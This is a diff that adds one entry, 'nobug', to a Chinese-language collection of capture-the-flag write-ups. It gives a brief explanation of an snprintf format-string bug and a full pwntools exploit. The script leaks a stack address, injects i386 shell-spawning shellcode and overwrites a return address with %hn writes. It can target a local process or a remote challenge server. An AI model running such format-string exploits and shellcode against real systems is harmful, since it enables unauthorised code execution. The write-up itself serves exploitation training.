@@ -3145,3 +3145,41 @@ if __name__ == '__main__':
 
     io.interactive()
 ```
+
+### 33.nobug
+题目：暂无
+
+思路：snprintf格式化字符串漏洞，主要坑点在于ida f5反编译的代码和汇编差别较大，隐藏了关键函数，需要仔细检查汇编代码，另外这个格式化字符串漏洞只能控制格式化串，不能控制栈的内容。
+
+全部代码如下：
+```python
+from pwn import *
+import base64
+
+debug = True
+if debug:
+    io = process('./a')
+    gdb.attach(io, gdbscript='''
+continue
+''')
+else:
+    io = remote('220.249.52.134', 54025)
+
+shellcode_addr = 0x804A8A0
+shellcode = asm(shellcraft.i386.sh())
+
+if __name__ == '__main__':
+    payload = base64.b64encode(b'%4$p')
+    io.sendline(payload)
+    data = io.recvuntil('\n')
+    print(data)
+    ebp = int(data[8:-1], 16)
+    payload = shellcode + b'%%%dc%%4$hhn' % (ebp+4-len(shellcode))
+    payload += b'%%%dc%%12$hn' % (shellcode_addr&0xFFFF - ebp - 4)
+    print(payload)
+    payload = base64.b64encode(payload)
+    pause()
+    io.sendline(payload)
+    pause()
+    io.interactive()
+```
